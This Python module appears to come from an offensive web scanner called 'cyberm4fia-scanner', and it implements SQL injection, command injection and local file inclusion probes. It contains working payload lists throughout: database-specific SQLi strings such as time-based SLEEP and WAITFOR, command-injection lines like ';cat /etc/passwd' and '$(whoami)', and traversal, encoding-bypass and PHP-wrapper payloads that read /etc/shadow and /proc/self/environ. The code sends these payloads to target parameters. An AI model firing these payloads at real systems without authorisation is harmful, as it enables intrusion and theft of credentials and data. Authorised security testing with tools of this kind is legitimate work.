"""
cyberm4fia-scanner - Smart Payload Engine v2: SQLi / CMDi / LFI Probes
Extracted from smart_payload.py to keep per-module size manageable.
"""

from utils.colors import log_info
from utils.request import smart_request
from utils.request import ScanExceptions

# ══════════════════════════════════════════
# SQLi SMART PROBE
# ══════════════════════════════════════════

# DB-specific error patterns
_DB_ERRORS = {
    "mysql": [
        "you have an error in your sql syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "unknown column",
        "warning: mysql",
    ],
    "postgresql": [
        "pg_query",
        "pg_exec",
        "unterminated quoted string",
        "psql:",
        "postgresql",
    ],
    "mssql": [
        "unclosed quotation mark",
        "microsoft sql",
        "odbc sql server",
        "mssql_query",
        "sqlsrv",
    ],
    "sqlite": [
        "sqlite3",
        "sqlite_",
        "unrecognized token",
        "sqlite.operationalerror",
    ],
    "oracle": [
        "ora-00",
        "oracle error",
        "quoted string not properly terminated",
    ],
}

# DB-specific comment syntax
_DB_COMMENTS = {
    "mysql": ["#", "-- -", "/**/"],
    "postgresql": ["--", "/**/"],
    "mssql": ["--", "/**/"],
    "sqlite": ["--", "/**/"],
    "oracle": ["--", "/**/"],
}

# DB-specific payloads
_DB_SQLI_PAYLOADS = {
    "mysql": [
        "' OR 1=1#",
        "' OR 1=1-- -",
        "' UNION SELECT NULL,NULL,NULL#",
        "1' ORDER BY 1#",
        "' AND SLEEP(3)#",
        "' AND 1=1#",
        "' AND 1=2#",
        "admin'#",
        "' OR ''='",
    ],
    "postgresql": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 1--",
        "'; SELECT pg_sleep(3)--",
        "' AND 1=1--",
    ],
    "mssql": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; WAITFOR DELAY '0:0:3'--",
        "' AND 1=1--",
    ],
    "sqlite": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=1--",
    ],
    "oracle": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL FROM dual--",
        "' AND 1=1--",
    ],
    "generic": [
        "' OR '1'='1",
        "' OR 1=1--",
        "') OR 1=1--",
        '" OR 1=1--',
        "' OR ''='",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "admin'--",
    ],
}

def probe_sqli_context(url, param, params, method="get", form_data=None, delay=0):
    """
    SQLi Smart Probe:
      1. Send quotes (' and ") → detect SQL errors
      2. Identify DB type from error message
      3. Generate DB-specific payloads
    """
    from urllib.parse import urlparse, urlencode, urlunparse

    result = {
        "db_type": None,
        "quote_type": None,
        "error_based": False,
        "smart_payloads": [],
    }

    def _send(value):
        if method == "get":
            tp = params.copy()
            tp[param] = value
            parsed = urlparse(url)
            turl = urlunparse(parsed._replace(query=urlencode(tp)))
            return smart_request("get", turl, delay=delay)
        else:
            data = form_data.copy() if form_data else {}
            data[param] = value
            return smart_request("post", url, data=data, delay=delay)

    try:
        # Get baseline
        baseline = _send("1")
        baseline_text = baseline.text.lower()

        # Test single quote
        resp_sq = _send("1'")
        sq_text = resp_sq.text.lower()

        # Test double quote
        resp_dq = _send('1"')
        dq_text = resp_dq.text.lower()

        # Detect DB type from error
        db_detected = None
        error_text = ""

        for probe_text in [sq_text, dq_text]:
            for db, errors in _DB_ERRORS.items():
                for err in errors:
                    if err in probe_text and err not in baseline_text:
                        db_detected = db
                        error_text = err
                        break
                if db_detected:
                    break
            if db_detected:
                break

        # Detect which quote triggers error
        # Check if SQL error patterns exist in the response (stronger check)
        all_err_patterns = [e for errs in _DB_ERRORS.values() for e in errs]

        def _has_sql_error(text):
            return any(e in text for e in all_err_patterns)

        sq_error = (
            sq_text != baseline_text
            and len(sq_text) != len(baseline_text)
            and (db_detected is not None or _has_sql_error(sq_text))
        )
        dq_error = (
            dq_text != baseline_text
            and len(dq_text) != len(baseline_text)
            and (db_detected is not None or _has_sql_error(dq_text))
        )

        quote = None
        if sq_error and not dq_error:
            quote = "'"
        elif dq_error and not sq_error:
            quote = '"'
        elif sq_error:
            quote = "'"  # Default to single quote

        result["db_type"] = db_detected
        result["quote_type"] = quote
        result["error_based"] = db_detected is not None

        # Generate payloads
        payloads = []
        if db_detected:
            payloads.extend(_DB_SQLI_PAYLOADS.get(db_detected, []))
            log_info(
                f"  🧠 SQLi Probe [{param}]: "
                f"DB={db_detected} | Quote={quote} | "
                f"Error='{error_text}' | "
                f"{len(payloads)} targeted payloads"
            )
        else:
            payloads.extend(_DB_SQLI_PAYLOADS["generic"])
            if quote:
                log_info(
                    f"  🧠 SQLi Probe [{param}]: "
                    f"DB=unknown | Quote={quote} | "
                    f"{len(payloads)} generic payloads"
                )

        result["smart_payloads"] = payloads

    except ScanExceptions:
        pass

    return result

# ══════════════════════════════════════════
# CMDi SMART PROBE
# ══════════════════════════════════════════

_CMDI_SEPARATORS = {
    "semicolon": ";",
    "pipe": "|",
    "double_pipe": "||",
    "ampersand": "&",
    "double_amp": "&&",
    "backtick": "`",
    "dollar_paren": "$(",
    "newline": "\n",
}

_CMDI_PAYLOADS_BY_SEP = {
    "semicolon": [";whoami", ";id", ";cat /etc/passwd", "; uname -a"],
    "pipe": ["|whoami", "|id", "|cat /etc/passwd", "| uname -a"],
    "double_pipe": ["||whoami", "||id"],
    "ampersand": ["&whoami", "&id"],
    "double_amp": ["&&whoami", "&&id"],
    "backtick": ["`whoami`", "`id`"],
    "dollar_paren": ["$(whoami)", "$(id)"],
    "newline": ["%0awhoami", "%0aid"],
}

def probe_cmdi_context(url, param, params, method="get", form_data=None, delay=0):
    """
    CMDi Smart Probe:
      1. Send each separator → check if filtered/stripped
      2. Generate payloads using only allowed separators
    """
    from urllib.parse import urlparse, urlencode, urlunparse

    result = {
        "allowed_separators": {},
        "smart_payloads": [],
    }

    def _send(value):
        if method == "get":
            tp = params.copy()
            tp[param] = value
            parsed = urlparse(url)
            turl = urlunparse(parsed._replace(query=urlencode(tp)))
            return smart_request("get", turl, delay=delay)
        else:
            data = form_data.copy() if form_data else {}
            data[param] = value
            return smart_request("post", url, data=data, delay=delay)

    try:
        probe = "cybm4test"
        allowed = {}

        for sep_name, sep_char in _CMDI_SEPARATORS.items():
            test_val = f"{probe}{sep_char}{probe}"
            try:
                resp = _send(test_val)
                # Check if separator survived (not stripped)
                if resp.status_code != 403:
                    allowed[sep_name] = True
                else:
                    allowed[sep_name] = False
            except ScanExceptions:
                allowed[sep_name] = False

        result["allowed_separators"] = allowed

        # Generate payloads from allowed separators
        payloads = []
        for sep_name, is_ok in allowed.items():
            if is_ok:
                payloads.extend(_CMDI_PAYLOADS_BY_SEP.get(sep_name, []))

        result["smart_payloads"] = payloads

        allowed_list = [n for n, ok in allowed.items() if ok]
        blocked_list = [n for n, ok in allowed.items() if not ok]
        if payloads:
            log_info(f"  🧠 CMDi Probe [{param}]: {len(payloads)} targeted payloads")
            if allowed_list:
                log_info(f"     ✅ Separators: {', '.join(allowed_list)}")
            if blocked_list:
                log_info(f"     ❌ Separators: {', '.join(blocked_list)}")

    except ScanExceptions:
        pass

    return result

# ══════════════════════════════════════════
# LFI SMART PROBE
# ══════════════════════════════════════════

# PHP wrappers to test
_LFI_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=string.rot13/resource=index",
    "php://input",
    "data://text/plain;base64,PD9waHAgZWNobyAnTEZJX1RFU1QnOyA/Pg==",
    "expect://whoami",
]

_LFI_DEPTH_PAYLOADS = {
    1: "../etc/passwd",
    2: "../../etc/passwd",
    3: "../../../etc/passwd",
    4: "../../../../etc/passwd",
    5: "../../../../../etc/passwd",
    6: "../../../../../../etc/passwd",
    8: "../../../../../../../../etc/passwd",
    10: "../../../../../../../../../../etc/passwd",
}

_LFI_BYPASS_PAYLOADS = [
    "....//....//....//....//etc/passwd",  # Double-dot bypass
    "..%2f..%2f..%2f..%2fetc/passwd",  # URL encoding
    "..%252f..%252f..%252fetc/passwd",  # Double encoding
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",  # Dot encoding
    "....\\\\....\\\\....\\\\etc/passwd",  # Backslash
    "/etc/passwd%00",  # Null byte (PHP < 5.3)
    "/etc/passwd%00.php",
]

def probe_lfi_context(url, param, params, method="get", form_data=None, delay=0):
    """
    LFI Smart Probe:
      1. Test traversal depth (how many ../ needed)
      2. Test if PHP wrappers work
      3. Test bypass techniques (null byte, encoding)
    """
    from urllib.parse import urlparse, urlencode, urlunparse

    result = {
        "traversal_depth": None,
        "wrappers_work": False,
        "null_byte": False,
        "smart_payloads": [],
    }

    lfi_sigs = ["root:x:0:0:", "root:*:0:0:", "[boot loader]"]

    def _send(value):
        if method == "get":
            tp = params.copy()
            tp[param] = value
            parsed = urlparse(url)
            turl = urlunparse(parsed._replace(query=urlencode(tp)))
            return smart_request("get", turl, delay=delay)
        else:
            data = form_data.copy() if form_data else {}
            data[param] = value
            return smart_request("post", url, data=data, delay=delay)

    def _has_lfi_sig(text):
        for sig in lfi_sigs:
            if sig in text:
                return True
        return False

    try:
        payloads = []

        # Phase 1: Find traversal depth
        found_depth = None
        for depth, payload in sorted(_LFI_DEPTH_PAYLOADS.items()):
            try:
                resp = _send(payload)
                if _has_lfi_sig(resp.text):
                    found_depth = depth
                    payloads.insert(0, payload)  # Best payload first
                    break
            except ScanExceptions:
                pass

        result["traversal_depth"] = found_depth

        if found_depth:
            log_info(
                f"  🧠 LFI Probe [{param}]: depth={found_depth} (../ × {found_depth})"
            )
            # Generate payloads at the right depth
            prefix = "../" * found_depth
            targets = [
                "etc/passwd",
                "etc/shadow",
                "etc/hosts",
                "etc/hostname",
                "proc/self/environ",
                "proc/self/cmdline",
                "proc/version",
                "var/log/apache2/access.log",
                "var/log/auth.log",
            ]
            for t in targets:
                payloads.append(prefix + t)

        # Phase 2: Test PHP wrappers (only need 1 request)
        try:
            wrapper = "php://filter/convert.base64-encode/resource=index"
            resp = _send(wrapper)
            import base64

            # If response contains valid base64 that decodes...
            for chunk in resp.text.split():
                try:
                    decoded = base64.b64decode(chunk)
                    if len(decoded) > 20 and b"<?" in decoded:
                        result["wrappers_work"] = True
                        log_info("     ✅ PHP wrappers: ENABLED (source code leak!)")
                        payloads.extend(_LFI_WRAPPERS)
                        break
                except ScanExceptions:
                    pass
        except ScanExceptions:
            pass

        # Phase 3: Always add bypass payloads
        payloads.extend(_LFI_BYPASS_PAYLOADS)

        result["smart_payloads"] = payloads

        if payloads:
            log_info(f"  🧠 LFI Probe [{param}]: {len(payloads)} targeted payloads")

    except ScanExceptions:
        pass

    return result
